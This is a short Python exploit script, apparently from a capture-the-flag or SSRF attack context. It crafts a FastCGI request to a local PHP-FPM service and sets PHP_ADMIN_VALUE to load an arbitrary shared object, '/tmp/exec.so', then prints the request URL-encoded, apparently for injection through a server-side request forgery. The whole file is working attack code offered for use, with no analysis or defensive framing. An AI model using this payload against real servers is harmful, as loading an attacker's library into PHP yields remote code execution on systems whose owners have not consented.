from FastCGIClient import FastCGIClient
from urllib.parse import quote as urlencode

def main():
    fcgi_client = FastCGIClient('127.0.0.1', '9000', 3000, 0)
    params = {'GATEWAY_INTERFACE': 'FastCGI/1.0',
                'REQUEST_METHOD': 'POST',
                'SCRIPT_FILENAME': '/www/index.php',
                'SCRIPT_NAME': '/index.php',
                'QUERY_STRING': '',
                'REQUEST_URI': '/index.php',
                'DOCUMENT_ROOT': '/www',
                'SERVER_SOFTWARE': 'php/fcgiclient',
                'REMOTE_ADDR': '127.0.0.1',
                'REMOTE_PORT': '9985',
                'SERVER_ADDR': '127.0.0.1',
                'SERVER_PORT': '80',
                'SERVER_NAME': "localhost",
                'SERVER_PROTOCOL': 'HTTP/1.1',
                'CONTENT_TYPE': 'application/x-www-form-urlencoded',
                'CONTENT_LENGTH': '0',
                'PHP_ADMIN_VALUE': 'extension = /tmp/exec.so'
                }
    print(urlencode(fcgi_client.request(params, 'x')))

if __name__ == '__main__':
    main()
